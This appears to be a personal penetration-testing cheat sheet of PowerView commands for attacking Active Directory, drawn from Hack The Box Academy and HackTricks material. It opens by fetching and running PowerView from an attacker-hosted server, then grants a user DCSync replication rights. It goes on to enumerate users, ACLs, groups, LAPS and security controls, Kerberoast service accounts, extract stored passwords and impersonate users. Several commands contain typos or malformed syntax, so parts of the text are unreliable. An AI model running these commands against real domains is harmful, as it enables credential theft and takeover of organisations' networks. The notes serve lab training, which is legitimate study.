get Powerview over to evil-winrm
```
IEX(New-obeject Net.Webclient).downloadString('http://kalipythonserver/PowerView.ps1)
```
Create user
```
$cred = New-Object System.Management.Automation.PSCredential()'ippsec', $pass)
```
create password
```
$pass = ConverTo-SecureString 'password' -AsPlaintText -force
```
Run powerview ps1 script
```
Add-DomainObjectACL -Credential $cred -TargetIdentity "DC=htb,Dc=local" -PrincipalIdentity user(created or owned) -Rights DCSync
```

# Username Enumeration
```powershell-session
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```


# ACL Enumeration
```powershell-session
Find-InterestingDomainAcl
```

username creds
```powershell-session
$sid = Convert-NameToSid wley
```

```powershell-session
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
With resolve GUIDS command
```powershell-session
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

From userlist
```powershell-session
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```

Group Enumeration
```powershell-session
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

```powershell-session
$itgroupsid = Convert-NameToSid "Information Technology"
```
```powershell-session
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
```

**USE BLOODHOUND
### Abusing ACL
https://academy.hackthebox.com/module/143/section/1486

# Kerbroasting

```powershell-session
Get-DomainUser * -spn | select samaccountname
```
#### Using PowerView to Target a Specific User
```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

# Security Control Enumeration
defender
```powershell-session
Get-MpComputerStatus
```

Applocker
```powershell-session
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

LAPS
```powershell-session
Get-LAPSComputers
```
```powershell-session
Find-AdmPwdExtendedRights
```
```powershell-session
Find-LAPSDelegatedGroups
```

# Enumeration
``` bash
Get-NetDomain #Basic domain info
#User info
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount #Basic user enabled info
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN #Kerberoastable users
#Groups info
Get-NetGroup | select samaccountname, admincount, description
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | %{ $_.SecurityIdentifier } | Convert-SidToName #Get AdminSDHolders
#Computers
Get-NetComputer | select samaccountname, operatingsystem
Get-NetComputer -Unconstrainusered | select samaccountname #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth | select samaccountname #Find computers with Constrained Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups
#Shares
Find-DomainShare -CheckShareAccess #Search readable shares
#Domain trusts
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
#LHF
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess
#Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
Invoke-UserHunter -CheckAccess
#Find interesting ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights | fl


```


### Domain info

```
# Domain Info
Get-Domain #Get info about the current domain
Get-NetDomain #Get info about the current domain
Get-NetDomain -Domain mydomain.local
Get-DomainSID #Get domain SID

# Policy
Get-DomainPolicy #Get info about the policy
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
Get-DomainPolicyData | select -ExpandProperty SystemAccess #Same as previous
(Get-DomainPolicy).PrivilegeRights #Check your privileges
Get-DomainPolicyData # Same as Get-DomainPolicy

# Domain Controller
Get-DomainController | select Forest, Domain, IPAddress, Name, OSVersion | fl # Get specific info of current domain controller
Get-NetDomainController -Domain mydomain.local #Get all ifo of specific domain Domain Controller

# Get Forest info 
Get-ForestDomain
```
### Users, Groups, Computers & OUs

```powershell
# Users
## Get usernames and their groups
Get-DomainUser -Properties name, MemberOf | fl
## Get-DomainUser and Get-NetUser are kind of the same
Get-NetUser #Get users with several (not all) properties
Get-NetUser | select samaccountname, description, pwdlastset, logoncount, badpwdcount #List all usernames
Get-NetUser -UserName student107 #Get info about a user
Get-NetUser -properties name, description #Get all descriptions
Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount  #Get all pwdlastset, logoncount and badpwdcount
Find-UserField -SearchField Description -SearchTerm "built" #Search account with "something" in a parameter
# Get users with reversible encryption (PWD in clear text with dcsync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Users Filters
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname #All enabled users
Get-NetUser -UACFilter ACCOUNTDISABLE #All disabled users
Get-NetUser -UACFilter SMARTCARD_REQUIRED #Users that require a smart card
Get-NetUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname #Not smart card users
Get-NetUser -LDAPFilter '(sidHistory=*)' #Find users with sidHistory set
Get-NetUser -PreauthNotRequired #ASREPRoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Get-Netuser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto #Constrained Resource Delegation
Get-NetUser -AllowDelegation -AdminCount #All privileged users that aren't marked as sensitive/not for delegation
# retrieve *most* users who can perform DC replication for dev.testlab.local (i.e. DCsync)
Get-ObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
# Users with PASSWD_NOTREQD set in the userAccountControl means that the user is not subject to the current password policy
## Users with this flag might have empty passwords (if allowed) or shorter passwords
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

#Groups
Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName
## Get-DomainGroup is similar to Get-NetGroup 
Get-NetGroup #Get groups
Get-NetGroup -Domain mydomain.local #Get groups of an specific domain
Get-NetGroup 'Domain Admins' #Get all data of a group
Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl #Search admin grups
Get-NetGroup -UserName "myusername" #Get groups of a user
Get-NetGroupMember -Identity "Administrators" -Recurse #Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
Get-NetGroupMember -Identity "Enterprise Admins" -Domain mydomain.local #Remember that "Enterprise Admins" group only exists in the rootdomain of the forest
Get-NetLocalGroup -ComputerName dc.mydomain.local -ListGroups #Get Local groups of a machine (you need admin rights in no DC hosts)
Get-NetLocalGroupMember -computername dcorp-dc.dollarcorp.moneycorp.local #Get users of localgroups in computer
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs #Check AdminSDHolder users
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} #Get ObjectACLs by sid
Get-NetGPOGroup #Get restricted groups

# Computers
Get-DomainComputer -Properties DnsHostName # Get all domain maes of computers
## Get-DomainComputer is kind of the same as Get-NetComputer
Get-NetComputer #Get all computer objects
Get-NetComputer -Ping #Send a ping to check if the computers are working
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
Get-NetComputer -TrustedToAuth #Find computers with Constrined Delegation
Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse | ?{$_.MemberName -like '*$'} #Find any machine accounts in privileged groups

#OU
Get-DomainOU -Properties Name | sort -Property Name #Get names of OUs
Get-DomainOU "Servers" | %{Get-DomainComputer -SearchBase $_.distinguishedname -Properties Name} #Get all computers inside an OU (Servers in this case)
## Get-DomainOU is kind of the same as Get-NetOU
Get-NetOU #Get Organization Units
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_} #Get all computers inside an OU (StudentMachines in this case)
```

### Impersonate a user

```
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```

#### ACL
```powershell
#Get ACLs of an object (permissions of other objects over the indicated one)
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs

#Other way to get ACLs of an object
$sid = Convert-NameToSid <username/group>
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

#Get permissions of a file
Get-PathAcl -Path "\\dc.mydomain.local\sysvol"

#Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
Find-InterestingDomainAcl -ResolveGUIDs

#Check if any of the interesting permissions founds is realated to a username/group
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} 

#Get special rights over All administrators in domain
Get-NetGroupMember -GroupName "Administrators" -Recurse | ?{$_.IsGroup -match "false"} | %{Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs} | select ObjectDN, IdentityReference, ActiveDirectoryRights
```

[](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview#set-values)